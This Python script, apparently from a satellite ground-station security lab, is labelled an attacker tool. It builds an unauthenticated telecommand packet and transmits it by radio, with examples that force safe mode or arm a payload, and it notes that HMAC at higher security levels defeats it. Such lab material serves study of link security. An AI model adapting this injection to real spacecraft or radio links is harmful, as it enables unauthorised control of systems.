"""
Command injection — build a TC from scratch and transmit it. No key
needed at security level 0. At L1+ this fails the HMAC check.

Usage examples:
    python -m groundstation.attacker.inject --port /dev/ttyACM1 \
        --apid 0x0FF                 # force-safe, no payload
    python -m groundstation.attacker.inject --port /dev/ttyACM1 \
        --apid 0x083 --data 01       # set-mode SAFE
    python -m groundstation.attacker.inject --port /dev/ttyACM1 \
        --apid 0x084                 # arm payload
"""

import argparse
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, ROOT)

from protocol import space_packet as sp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port")
    ap.add_argument("--sim",  action="store_true")
    ap.add_argument("--node-id", default="ATKR")
    ap.add_argument("--apid", type=lambda v: int(v, 0), required=True)
    ap.add_argument("--data", default="", help="hex payload bytes")
    ap.add_argument("--seq",  type=int, default=1)
    ap.add_argument("--freq", type=int, default=433_920_000)
    ap.add_argument("--sync", default="d391")
    ap.add_argument("--bitrate", type=int, default=9600)
    args = ap.parse_args()

    body = bytes.fromhex(args.data) if args.data else b""
    frame = sp.encode(sp.TYPE_TC, args.apid, args.seq, body)
    print("Built TC apid=0x%03x seq=%d  frame=%s" % (args.apid, args.seq, frame.hex()))

    if not args.sim and not args.port:
        ap.error("--port is required unless --sim is given")
    from sim.sim_link import make_link
    link = make_link(args, default_node_id=args.node_id)
    time.sleep(0.5)
    link.send_cfg(args.freq, int(args.sync, 16), args.bitrate)
    link.send_tx(frame)
    time.sleep(0.5)


if __name__ == "__main__":
    main()
